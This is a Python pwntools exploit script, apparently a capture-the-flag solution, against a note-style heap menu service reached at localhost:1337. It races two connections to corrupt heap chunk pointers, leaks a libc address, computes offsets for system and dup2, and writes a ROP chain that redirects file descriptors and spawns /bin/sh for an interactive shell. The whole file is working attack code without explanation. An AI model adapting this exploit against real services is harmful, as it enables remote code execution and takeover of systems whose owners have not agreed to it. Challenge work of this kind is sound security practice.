from pwn import *


def send(r,b,a=":"):
    r.sendlineafter(a,str(b))

def send2(r,b,a=":"):
    r.sendafter(a,str(b))

def create(r, size):
    send(r,1, 'Exit')
    send(r,size)

def edit(r, index, data):
    send(r,2, 'Exit')
    send(r,index)
    send2(r,data)

def delete(r, index):
    send(r,3, 'Exit')
    send(r,index)
    send(r,'y')

p = remote('localhost',1337)

create(p,512)
create(p,512)
create(p,10)
create(p,32)
create(p,32)
delete(p,2)

delete(p,0)


send(p,3, 'Exit')
send(p,1)

q = remote('localhost',1337)
edit(q,1,'\xd0\x08')

send(p,'y')
create(p,512)
create(p,512)
edit(p,1,p64(0x1)*16+'\x80\x08')

delete(p,3)
send(p,3, 'Exit')
send(p,4)

edit(q,4,'\x70\x08')

send(p,'y')

create(p,32)#2
create(p,32)#3

edit(p,3,'/bin/sh\x00'+p64(0x35))

create(p,24)#4
edit(p,4,'z'*14+'--')

delete(p,4)
t = p.readuntil('What')[:-4]
t = t.split('--')

leak = u64(t[1].ljust(8,'\x00'))
print hex(leak)

libc = leak-0x1beb80
free_hook = libc+0x1c1e70
system = libc+0x48df0
dup = libc+0xef6e0
dup2 = libc+0xef710

qstack = libc-0x805108

edit(p,1,p64(0x0001000100010001)*16+p64(qstack)*30)

create(p,300)#4

rdi = libc+0x00000000001323a0
rsi = libc+0x0000000000135b94
rdx = libc+0x00000000000cb16d
rax = libc+0x000000000004b85b
subrax = libc+0x000000000009d958
xchg = libc+0x00000000000f939e #xchg eax, esi; or al, 0; pop r12; pop r13; ret;
xchg = libc+0x0000000000129fdc

binsh = libc+0x18a156


chain = [rdi,0,dup,rdi, 2, subrax,xchg,rsi,0,dup2,rsi,1,dup2,rsi,2,dup2,rdi,binsh,system]
chain = ''.join(map(p64,chain))

edit(p,4,chain)



q.interactive()
